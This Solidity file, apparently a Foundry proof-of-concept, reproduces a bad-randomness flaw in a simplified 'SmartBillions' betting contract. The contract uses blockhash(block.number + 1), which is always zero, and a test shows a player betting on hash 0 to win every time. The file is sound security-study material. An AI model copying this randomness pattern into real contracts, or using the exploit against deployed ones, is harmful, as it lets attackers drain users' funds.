pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract SmartBillions {
    address public owner;
    uint public betMax;
    mapping(address => uint) public walletBalanceOf;
    mapping(address => uint) public betValueOf;
    mapping(address => uint32) public betHashOf;

    constructor() {
        owner = msg.sender;
        betMax = 5 ether;
    }

    function setBetMax(uint _betMax) external {
        require(msg.sender == owner, "Only owner");
        betMax = _betMax;
    }

    function invest(address) external payable {
        walletBalanceOf[msg.sender] += msg.value;
    }

    // Vulnerable bet function - randomness depends on blockhash of blockNum
    function bet(uint192 value, uint32 betHash) external payable {
        require(value <= betMax, "Bet too high");
        require(walletBalanceOf[msg.sender] >= value, "Insufficient balance");

        walletBalanceOf[msg.sender] -= value;
        betValueOf[msg.sender] = value;
        betHashOf[msg.sender] = betHash;
    }

    // Vulnerable won() function - uses blockhash of block.number + 1 for randomness
    function won() external {
        uint32 betHash = betHashOf[msg.sender];
        uint192 betValue = uint192(betValueOf[msg.sender]);
        require(betValue > 0, "No bet placed");

        // Vulnerability: uses blockhash(block.number + 1) which is zero
        uint24 random = uint24(uint256(blockhash(block.number + 1)));

        if (random == betHash) {
            // Win: double the bet value added to wallet balance
            walletBalanceOf[msg.sender] += betValue * 2;
            betValueOf[msg.sender] = 0;
            betHashOf[msg.sender] = 0;
        } else {
            // Lose: bet value lost (already deducted)
            betValueOf[msg.sender] = 0;
            betHashOf[msg.sender] = 0;
        }
    }
}

contract ExploitTest is Test {
    SmartBillions sb;
    address player = address(0xBEEF);

    function setUp() public {
        sb = new SmartBillions();

        // Fund player with some ether to make bets
        vm.deal(player, 10 ether);

        // Fund the contract sufficiently for payouts
        vm.deal(address(sb), 100 ether);

        // Set player balance in token for betting (simulate invest)
        vm.startPrank(sb.owner());
        sb.setBetMax(5 ether);
        vm.stopPrank();

        // Mint tokens to player by investing (simulate)
        vm.prank(player);
        sb.invest{value: 1 ether}(address(0));
    }

    function test_exploit_bad_randomness() public {
        vm.startPrank(player);

        uint192 betValue = 1 ether;

        // Predict the randomness: blockhash(block.number + 1) is always zero in tests
        uint24 predictedHash = uint24(uint256(blockhash(block.number + 1)));

        // predictedHash will be zero, so betHash = 0 for guaranteed win
        uint32 betHash = uint32(predictedHash);

        // Place the bet with betHash = 0
        sb.bet(betValue, betHash);

        // Call won() to claim prize
        sb.won();

        // Check player wallet balance increased (should be initial + 2 * betValue)
        uint walletBalance = sb.walletBalanceOf(player);

        assertGt(walletBalance, 1 ether, "Player wallet balance should increase after winning");

        vm.stopPrank();
    }
}

